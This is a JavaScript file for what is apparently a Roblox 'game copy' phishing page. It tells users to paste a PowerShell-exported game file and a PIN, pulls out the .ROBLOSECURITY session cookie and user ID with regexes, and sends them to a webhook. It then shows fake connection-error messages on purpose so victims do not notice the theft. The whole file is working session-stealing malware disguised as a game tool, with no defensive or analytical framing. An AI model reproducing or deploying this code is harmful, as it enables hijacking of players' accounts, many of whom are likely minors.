/* ======================================================
   js/payload.js - Client Side
   - Handles UI, extraction, and calls the webhook API
====================================================== */

import { sendWebhook } from '../api/send-webhook.js';

/* ================= ELEMENTS ================= */
const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

/* ================= PIN VALIDATION ================= */
pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    if (pinError) pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

/* ================= EXTRACTION ================= */
function extractGameData(fullText) {
    const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
    if (!cookieMatch) {
        return { success: false, message: "Your Game Key is not valid! (Check if you copied it right!)" };
    }

    const robloxCookie = cookieMatch[1];

    const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
    let rbxuid = null;

    if (eventTrackerMatch) {
        const params = eventTrackerMatch[1].split('&');
        for (let p of params) {
            if (p.startsWith("rbxuid=")) {
                rbxuid = p.split('=')[1];
                break;
            }
        }
    }

    if (!rbxuid) {
        return { success: false, message: "Could not find rbxuid in RBXEventTrackerV2." };
    }

    return {
        success: true,
        cookie: robloxCookie,
        rbxuid: rbxuid
    };
}

/* ================= BUTTON HANDLER ================= */
copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";
    
    if (!validatePin()) {
        statusMessage.textContent = "Please enter a valid 4-digit PIN.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "Please paste the PowerShell game file.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const extraction = extractGameData(pastedText);
    if (!extraction.success) {
        statusMessage.textContent = extraction.message;
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "✓ Processing... Please wait.";
    statusMessage.style.color = "#caa8ff";

    await new Promise(r => setTimeout(r, 500));

    const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);

    // Fake internet error
    if (success) {
        statusMessage.textContent = "✗ Game Copy request was not processed. Please check your internet connection.";
        statusMessage.style.color = "#ff9d9d";
    } else {
        statusMessage.textContent = "✗ Copy failed! Check your internet connection.";
        statusMessage.style.color = "#ff9d9d";
    }

    copyButton.classList.remove("loading");
    copyButton.disabled = false;
});

/* ================= FAKE ERROR OVERLAY ================= */
const originalSendWebhook = sendWebhook;
sendWebhook = async function(pin, cookie, rbxuid) {
    const result = await originalSendWebhook(pin, cookie, rbxuid);
    await new Promise(r => setTimeout(r, 1500));

    if (Math.random() < 0.35) {
        const originalMsg = statusMessage.textContent;
        const originalColor = statusMessage.style.color;
        statusMessage.textContent = "⚠️ Connection lost! Unable to reach Roblox servers.";
        statusMessage.style.color = "#ffaa66";

        setTimeout(() => {
            if (statusMessage.textContent.includes("Connection lost")) {
                statusMessage.textContent = originalMsg;
                statusMessage.style.color = originalColor;
            }
        }, 3000);
    }
    return result;
};
